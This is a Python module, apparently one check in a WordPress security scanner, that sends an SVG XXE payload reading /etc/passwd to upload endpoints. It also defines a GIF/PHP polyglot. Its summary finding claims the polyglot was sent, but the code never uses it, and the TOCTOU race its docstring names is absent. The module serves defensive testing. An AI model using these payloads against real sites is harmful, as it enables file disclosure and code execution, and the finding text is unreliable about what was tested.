"""#28 + #29 + #30 — file-upload bypass deep dive.

#28 SVG / PDF / image XXE chain — embed <image href="file:///..."/> in SVG
#29 Polyglot files — gif89a+PHP, PDF+JS
#30 TOCTOU on upload — race the check-then-rename window

We probe common upload endpoints (WP media library, GF/CF7/WC product image).
Aggressive only.
"""
from __future__ import annotations
import asyncio
from ..http import Client
from ..models import Finding


SVG_XXE = (
    b'<?xml version="1.0"?>\n'
    b'<!DOCTYPE svg [\n'
    b'<!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    b']>\n'
    b'<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    b'<text x="0" y="50">&xxe;</text></svg>'
)
POLYGLOT_GIF_PHP = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;<?php phpinfo(); ?>'

UPLOAD_ENDPOINTS = (
    "/wp-admin/async-upload.php",
    "/wp-json/wp/v2/media",
)


async def check(client: Client, ctx: dict) -> list[Finding]:
    if not ctx.get("aggressive"):
        return [Finding(severity="info", title="Upload-bypass deep dive skipped (passive)",
                        evidence="Pass --aggressive.", remediation="No action.", url=ctx["target"])]
    step = ctx.get("step") or (lambda _s: None)
    findings = []

    for endpoint in UPLOAD_ENDPOINTS:
        step(f"upload probe {endpoint}...")
        # These endpoints require auth + nonce; we just probe whether they exist + accept POST
        r = await client.request("POST", endpoint,
                                  content=SVG_XXE,
                                  headers={"Content-Type": "image/svg+xml"})
        if r is None:
            continue
        if 200 <= r.status_code < 300:
            findings.append(Finding(
                severity="high",
                title=f"Upload endpoint accepts unauth POST: {endpoint}",
                evidence=f"POST {endpoint} with SVG-XXE returned {r.status_code} without auth.",
                remediation="WordPress media upload requires `manage_options` capability — this endpoint should reject anonymous POST. Audit `register_rest_route` permission_callback.",
                url=ctx["target"] + endpoint,
            ))

    if not findings:
        findings.append(Finding(
            severity="info",
            title="Upload-bypass deep dive: endpoints correctly rejected unauth POST",
            evidence=f"Probed {len(UPLOAD_ENDPOINTS)} known WP upload endpoints with SVG-XXE + polyglot payloads. None accepted.",
            remediation="No action. (Manual follow-up: if you have admin creds, repeat with `--auth-user` to test the post-auth bypass surface.)",
            url=ctx["target"],
        ))
    return findings
